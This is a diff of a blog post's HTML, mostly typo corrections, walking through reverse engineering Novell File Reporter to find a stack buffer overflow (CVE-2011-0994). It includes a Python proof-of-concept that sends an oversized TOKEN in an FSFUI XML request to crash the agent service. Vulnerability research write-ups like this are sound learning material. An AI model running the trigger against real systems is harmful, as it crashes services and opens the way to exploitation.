@@ -5,13 +5,13 @@
   
   <title>The Vupen Entry Test (Part 1) | Charles Muiruri</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Sometime back while looking for challanges to do , I came a cross an article that said how big security companies give guys challanges to test their skills. As a result, I tried to find if I can find">
+  <meta name="description" content="Sometime back while looking for challenges to do , I came a cross an article that said how big security companies give guys challenges to test their skills. As a result, I tried to find if I can find">
 <meta name="keywords" content="Reversing Engineering, Windows, Vulnerability research">
 <meta property="og:type" content="article">
 <meta property="og:title" content="The Vupen Entry Test (Part 1)">
 <meta property="og:url" content="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/index.html">
 <meta property="og:site_name" content="Charles Muiruri">
-<meta property="og:description" content="Sometime back while looking for challanges to do , I came a cross an article that said how big security companies give guys challanges to test their skills. As a result, I tried to find if I can find">
+<meta property="og:description" content="Sometime back while looking for challenges to do , I came a cross an article that said how big security companies give guys challenges to test their skills. As a result, I tried to find if I can find">
 <meta property="og:image" content="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/main.png">
 <meta property="og:image" content="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/strings.png">
 <meta property="og:image" content="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/token_string.png">
@@ -24,10 +24,10 @@
 <meta property="og:image" content="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/buffer.png">
 <meta property="og:image" content="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/buffer_1.png">
 <meta property="og:image" content="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/crash.png">
-<meta property="og:updated_time" content="2017-12-05T13:46:03.000Z">
+<meta property="og:updated_time" content="2017-12-05T17:28:18.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="The Vupen Entry Test (Part 1)">
-<meta name="twitter:description" content="Sometime back while looking for challanges to do , I came a cross an article that said how big security companies give guys challanges to test their skills. As a result, I tried to find if I can find">
+<meta name="twitter:description" content="Sometime back while looking for challenges to do , I came a cross an article that said how big security companies give guys challenges to test their skills. As a result, I tried to find if I can find">
 <meta name="twitter:image" content="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/main.png">
   
     <link rel="alternate" href="/atom.xml" title="Charles Muiruri" type="application/atom+xml">
@@ -127,30 +127,30 @@ ga('send', 'pageview');
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Sometime back while looking for challanges to do , I came a cross an article that said how big security companies give guys challanges to test their skills. As a result, I tried to find if I can find some of this challanges. I eventually bumped in to an Entry test that belongs to Vupen (whose founder went ahead to launch Zerodium). This seemed really interesting. </p>
-<p>In this post we will focus on reversing, bug hunting and triggering the bug we find. Theere will be a follow up (Part 2 that focuses on the exploitation part). </p>
+        <p>Sometime back while looking for challenges to do , I came a cross an article that said how big security companies give guys challenges to test their skills. As a result, I tried to find if I can find some of these challenges. I eventually bumped in to an Entry test that belongs to Vupen (whose founder went ahead to launch Zerodium). This seemed really interesting. </p>
+<p>In this post we will focus on reversing, bug hunting and triggering the bug we find. There will be a follow up (Part 2 that focuses on the exploitation part). </p>
 <p>Let the detective work begin 🕵️ .</p>
 <a id="more"></a>
 <h3 id="The-test"><a href="#The-test" class="headerlink" title="The test"></a>The test</h3><p>The vulnerability to analyze is the following (CVE-2011-0994):</p>
 <p><a href="http://dl.packetstormsecurity.net/1104-advisories/ZDI-11-116.txt" target="_blank" rel="external">http://dl.packetstormsecurity.net/1104-advisories/ZDI-11-116.txt</a></p>
 <p>You are expected to provide a code execution exploit  with DEP bypass (if possible) to run calc.exe . The code should be developed in Python 2.x or 3.x. If you do <em>not</em> manage to exploit the flaw, please provide a python PoC which shows control of EIP.</p>
-<h1 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h1><p>Well the first thing I did was look for the software of interest i.e the Novell File Reporter software, refered to as NFR as from now.<br>Well this was easily available from their site. So I grabbed the relevant version ie 1.0.1.</p>
+<h1 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h1><p>The first thing I did was look for the software of interest i.e the Novell File Reporter software, refered to as NFR from now.<br>This was easily available from their site. So I grabbed the relevant version i.e. 1.0.1.</p>
 <p>In this case I didn’t to do any diffs so I opted to take the long way and reverse from scratch.<br>Next step is to install the Novell File Reporter software so as to get the executables,  in this case, NFRAgent.exe.</p>
-<p>Given that I have some information of the type of bug I am after, I dint have to do alot of reconnaissance so I just loaded the executable to IDA (I simply call this BAE).</p>
+<p>Given that I have some information of the type of bug I am after, I didn’t have to do alot of reconnaissance so I just loaded the executable to IDA (I simply call this BAE).</p>
 <p><img src="/2017/12/05/The-Vupen-Entry-Test-Part-1/main.png" alt="main"></p>
 <p>Looking at the main function reversing this seems like a walk in the park ,since there IDA imports windows signatures making it easy for use (Also having reversed a couple of firmware this was fairly easy). Now the next step is finding a good attack surtface that meets our requirements. In this case, the bug is specifically a stack buffer overflow hence a good target would be some sort of input that overflows a buffer in the stack. </p>
-<p>The first step is to go through the string just to get a feel of what kind of strings are available. In this case, I am focusing more on strings that might print out or log user input.<br>to narrow down my search I am looking for any string that uses string formating. Well one might ask why strings ? Its simple if its a string I have control of it plus we have the word  <strong> <em> stack buffer</em> </strong> and from the aforementioned I am looking for anything that might allow me to overflow a  buffer on the stack. </p>
+<p>The first step is to go through the string just to get a feel of what kind of strings are available. In this case, I am focusing more on strings that might print out or log user input.<br>to narrow down my search I am looking for any string that uses string formating.One might ask why strings ? It’s simple if its a string I have control of it plus we have the word  <strong> <em> stack buffer</em> </strong> and from the aforementioned I am looking for anything that might allow me to overflow a  buffer on the stack. </p>
 <p><img src="/2017/12/05/The-Vupen-Entry-Test-Part-1/strings.png" alt="Strings"></p>
 <p>Looking  through the string we find  a string that looks interesting .</p>
 <p><img src="/2017/12/05/The-Vupen-Entry-Test-Part-1/token_string.png" alt="Token String"></p>
-<p>The above string seems to take a token and use it or print it .Well at this point its not clear how the string is use but surely looks intersting. To have a deeper understanding it would be wise at this point to figure out how a token is created.</p>
-<h3 id="Understanding-NFRAgent-exe"><a href="#Understanding-NFRAgent-exe" class="headerlink" title="Understanding NFRAgent.exe"></a>Understanding NFRAgent.exe</h3><p>Looking the main funtion the program begins by creating a new operator if creation was succesful it passes the a value to a functiion which I have named setup_sr_engine.</p>
+<p>The above string seems to take a token and use it or print it . At this point its not clear how the string is used but surely looks intersting. To have a deeper understanding it would be wise at this point to figure out how a token is created.</p>
+<h3 id="Understanding-NFRAgent-exe"><a href="#Understanding-NFRAgent-exe" class="headerlink" title="Understanding NFRAgent.exe"></a>Understanding NFRAgent.exe</h3><p>Looking the main funtion the program begins by creating a new operator if creation was succesful it passes the value to a function which I have named setup_sr_engine.</p>
 <p><img src="/2017/12/05/The-Vupen-Entry-Test-Part-1/main_1.png" alt="main"></p>
 <p>Looking carefully, at setup_sr_engine we can see that it sets a new ServerNetworkInterface whose 6th argument is a  pointer to a function which we have named connection request.</p>
 <p><img src="/2017/12/05/The-Vupen-Entry-Test-Part-1/setup_sr.png" alt="Ssetup_sr_engine"></p>
 <p>Now let  dive deeper into connection_request</p>
 <p><img src="/2017/12/05/The-Vupen-Entry-Test-Part-1/connection_request.png" alt="Connection request"></p>
-<p>Looking at the above it is evident that this functions identifies the connection requestion based on a key provided as part of the connection request eg FSFUI. In this case we will focus on handle_FSFUI_request .</p>
+<p>Looking at the above it is evident that this functions identifies the connection request based on a key provided as part of the connection request e.g. FSFUI. In this case we will focus on handle_FSFUI_request .</p>
 <p>This function handles a FSFUI request  which later tries to validate the specific request type</p>
 <p><img src="/2017/12/05/The-Vupen-Entry-Test-Part-1/handle_FSFUI_request.png" alt="handle_FSFUI_request"></p>
 <p><img src="/2017/12/05/The-Vupen-Entry-Test-Part-1/validate_request_type.png" alt="validate_request_type"></p>
@@ -169,17 +169,17 @@ ga('send', 'pageview');
 <li>We can send this string request remotely through port 80 for http and 3037 for https</li>
 </ol>
 <p>Looking at the above facts we are right to say we have a bug.</p>
-<h4 id="WOOOOT-🎉🎉🎉🎉-We-have-a-bug"><a href="#WOOOOT-🎉🎉🎉🎉-We-have-a-bug" class="headerlink" title="WOOOOT !!! 🎉🎉🎉🎉  We have a bug."></a>WOOOOT !!! 🎉🎉🎉🎉  We have a bug.</h4><h3 id="Triggering-the-bug"><a href="#Triggering-the-bug" class="headerlink" title="Triggering the bug"></a>Triggering the bug</h3><p>Well the best langugae  for such would be python given that its remote attack.</p>
-<p>In this case,  the request of interest in this case would all the key that we called along the request .<br>As a result the request will look like this<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ROOT&gt;&lt;NAME&gt;FSFUI&lt;/NAME&gt;&lt;UICMD&gt;130&lt;/UICMD&gt;&lt;TOKEN&gt;OUR TOKEN VALUE&lt;/TOKEN&gt;&lt;![CDATA[]]&gt;&lt;/ROOT</div></pre></td></tr></table></figure></p>
+<h4 id="WOOOOT-🎉🎉🎉🎉-We-have-a-bug"><a href="#WOOOOT-🎉🎉🎉🎉-We-have-a-bug" class="headerlink" title="WOOOOT !!! 🎉🎉🎉🎉  We have a bug."></a>WOOOOT !!! 🎉🎉🎉🎉  We have a bug.</h4><h3 id="Triggering-the-bug"><a href="#Triggering-the-bug" class="headerlink" title="Triggering the bug"></a>Triggering the bug</h3><p>The best langugae  for such would be python given that it’s a remote attack.</p>
+<p>In this case,  the request of interest would have all the keys that we come along before we reach to  handle_FSFUI_request .<br>As a result the request will look like this<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ROOT&gt;&lt;NAME&gt;FSFUI&lt;/NAME&gt;&lt;UICMD&gt;130&lt;/UICMD&gt;&lt;TOKEN&gt;OUR TOKEN VALUE&lt;/TOKEN&gt;&lt;![CDATA[]]&gt;&lt;/ROOT</div></pre></td></tr></table></figure></p>
 <p>Given that its an xml request we will send in that form </p>
 <h4 id="The-trigger-code"><a href="#The-trigger-code" class="headerlink" title="The trigger code"></a>The trigger code</h4> <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"> <span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line">import httplib, md5, sys,struct</div><div class="line"></div><div class="line">def message_MD5(arg):</div><div class="line">    v = <span class="string">"SRS"</span> + arg + <span class="string">"SERVER"</span></div><div class="line">    m = md5.new(v)</div><div class="line">    <span class="built_in">return</span> m.hexdigest()</div><div class="line"></div><div class="line">try:</div><div class="line">	conn = httplib.HTTPConnection(<span class="string">"192.168.0.12:80"</span>)</div><div class="line">	headers = &#123;<span class="string">"Content-type"</span>: <span class="string">"text/xml"</span>&#125;</div><div class="line"></div><div class="line">	</div><div class="line"></div><div class="line">	junk = <span class="string">'A'</span> * 100</div><div class="line"></div><div class="line"></div><div class="line">	body = <span class="string">"&lt;ROOT&gt;&lt;NAME&gt;FSFUI&lt;/NAME&gt;&lt;UICMD&gt;130&lt;/UICMD&gt;&lt;TOKEN&gt;"</span>+junk+<span class="string">"&lt;/TOKEN&gt;&lt;![CDATA[]]&gt;&lt;/ROOT&gt;"</span></div><div class="line"></div><div class="line">	body =  message_MD5(body).upper() + body</div><div class="line">	conn.request(<span class="string">"POST"</span>, <span class="string">"/"</span>,body, headers)</div><div class="line">	response = conn.getresponse()</div><div class="line">	<span class="built_in">print</span>(<span class="string">"[+] Connected successfuly"</span>)</div><div class="line">	<span class="built_in">print</span> response.status, response.reason</div><div class="line"> </div><div class="line">except Exception as e:</div><div class="line">	<span class="built_in">print</span>(<span class="string">"[-] Connection failed with error %s"</span>,e)</div><div class="line">finally:</div><div class="line">	conn.close()</div></pre></td></tr></table></figure>
 <p><img src="/2017/12/05/The-Vupen-Entry-Test-Part-1/crash.png" alt="Crash"></p>
-<h4 id="WOOOOT-🎉🎉🎉🎉-We-a-crash-occurs-We-have-succesfully-triggered-the-bug-🤓-😎-💪"><a href="#WOOOOT-🎉🎉🎉🎉-We-a-crash-occurs-We-have-succesfully-triggered-the-bug-🤓-😎-💪" class="headerlink" title="WOOOOT !!! 🎉🎉🎉🎉  We a crash occurs .   We have succesfully triggered the bug 🤓 😎 💪 ."></a>WOOOOT !!! 🎉🎉🎉🎉  We a crash occurs .   We have succesfully triggered the bug 🤓 😎 💪 .</h4><p>Part 2 will cover DEP bypass, SEH bypass and controlling the EIP stay tunned 😀 .</p>
+<h4 id="WOOOOT-🎉🎉🎉🎉-A-crash-occurs-We-have-succesfully-triggered-the-bug-🤓-😎-💪"><a href="#WOOOOT-🎉🎉🎉🎉-A-crash-occurs-We-have-succesfully-triggered-the-bug-🤓-😎-💪" class="headerlink" title="WOOOOT !!! 🎉🎉🎉🎉  A crash occurs .   We have succesfully triggered the bug 🤓 😎 💪 ."></a>WOOOOT !!! 🎉🎉🎉🎉  A crash occurs .   We have succesfully triggered the bug 🤓 😎 💪 .</h4><p>Part 2 will cover DEP bypass, SEH bypass and controlling the EIP stay tuned 😀 .</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/" data-id="cjatoj0jw0002ta2y5w91dt2p" class="article-share-link">Share</a>
+      <a data-url="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/" data-id="cjatwf1ni0003ak2yd9iszkz5" class="article-share-link">Share</a>
       
         <a href="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/#disqus_thread" class="article-comment-link">Comments</a>
       
